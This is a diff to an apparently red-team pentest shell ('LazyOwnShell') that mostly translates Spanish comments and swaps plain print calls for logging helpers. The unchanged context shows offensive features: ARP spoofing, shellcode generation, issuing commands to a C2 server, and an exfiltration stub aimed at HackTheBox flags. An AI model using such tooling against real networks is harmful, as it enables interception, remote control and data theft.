@@ -1400,11 +1400,11 @@ class LazyOwnShell(cmd2.Cmd):
         print_msg(f"Command '{command_name}' register from Lua.")
 
     def load_plugins(self):
-        """Carga todos los plugins Lua desde el directorio 'plugins/'."""
+        """Load every Lua plugin from the 'plugins/' directory."""
         plugins_dir = self.plugins_dir
         if not os.path.exists(plugins_dir):
             os.makedirs(plugins_dir)
-            print("Directorio de plugins creado.")
+            print_msg("Plugin directory created.")
             return
 
         for filename in os.listdir(plugins_dir):
@@ -9110,7 +9110,6 @@ class LazyOwnShell(cmd2.Cmd):
 
 
         parts = line.split(" ")
-        print(len(parts))
         if len(parts) != 2:
             print_error("Usage: rot <number> extension example: rot 13 js")
             return
@@ -12099,7 +12098,7 @@ class LazyOwnShell(cmd2.Cmd):
             choice = input(f"    {CYAN}[!] Set up ip and mac Example (IP: (192.168.1.100) MAC: de:ad:be:ef:00:00): {RESET}")
             target_ip, target_mac = parse_ip_mac(choice)
             if target_ip and target_mac:
-                print(f"IP: {target_ip}, MAC: {target_mac}")
+                print_msg(f"IP: {target_ip}, MAC: {target_mac}")
             gateway_ip = "192.168.1.1"
             my_mac = "00:11:22:33:44:55"
             print_msg("Available Interfaces: ")
@@ -12113,10 +12112,10 @@ class LazyOwnShell(cmd2.Cmd):
 
             packet = create_arp_packet(my_mac, gateway_ip, target_ip, target_mac)
             send_packet(packet, iface)
-            print(f"Sent spoofing packet to {target_ip} with MAC {target_mac}")
+            print_msg(f"Sent spoofing packet to {target_ip} with MAC {target_mac}")
 
         except Exception as e:
-            print(f"Error: {e}")
+            print_error(f"Error: {e}")
 
     @cmd2.with_category(exploitation_category)
     def do_sqli(def_func, line):
@@ -15560,7 +15559,7 @@ class LazyOwnShell(cmd2.Cmd):
         """
 
         if not line:
-            print("No password provided.")
+            print_warn("No password provided.")
             return
 
         hex_password = line.strip().upper()
@@ -25111,9 +25110,9 @@ class LazyOwnShell(cmd2.Cmd):
             shellcode = donut.create(file=input_exe)
             with open(output_bin, "wb") as f:
                 f.write(shellcode)
-            print(f"Shellcode written to {output_bin}")
+            print_msg(f"Shellcode written to {output_bin}")
         except Exception as e:
-            print(f"Error generating shellcode: {e}")
+            print_error(f"Error generating shellcode: {e}")
 
     @cmd2.with_category(post_exploitation_category)
     def do_atomic_lazyown(self, line):
@@ -25360,10 +25359,6 @@ class LazyOwnShell(cmd2.Cmd):
         data = {"client_id": clientid, "command": command}
 
         try:
-            print(f"URL: {self.c2_url}")
-            print(f"Auth: {self.c2_auth}")
-            print(f"Data: {data}")
-
             # Send the HTTPS request (ignore certificate errors with verify=False)
             response = requests.post(f"{self.c2_url}/issue_command", auth=self.c2_auth, data=data, verify=False)
             response.raise_for_status()  # Raise an exception if the status code is not 200
@@ -26744,7 +26739,7 @@ class LazyOwnShell(cmd2.Cmd):
         with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
             sock.sendto(magic_packet, (rhost, rport))
 
-        print(f"Magic packet sent to {rhost}:{rport}")
+        print_msg(f"Magic packet sent to {rhost}:{rport}")
 
     @cmd2.with_category(exfiltration_category)
     def do_download_c2(self, line):
@@ -27185,8 +27180,7 @@ class LazyOwnShell(cmd2.Cmd):
         Returns:
             None
         """
-        # TODO crear parte que hace upload de la data y la parte que hace exfiltracion de lso datos por ejemplo las banderas de hackthebox
-        print(len(line))
+        # TODO: implement the data-upload stage and the exfiltration stage (for example HackTheBox flags).
         c2_port = self.params["c2_port"]
         lhost = self.params["lhost"]
         lport = self.params["lport"]
@@ -27311,7 +27305,7 @@ class LazyOwnShell(cmd2.Cmd):
                     print_msg(f"Command copied to clipboard: {command}")
                 time.sleep(int(adversary.sleep))
         else:
-            print(f"No adversary found with id {line}")
+            print_warn(f"No adversary found with id {line}")
 
     @cmd2.with_category(post_exploitation_category)
     def do_ofuscate_string(self, line):
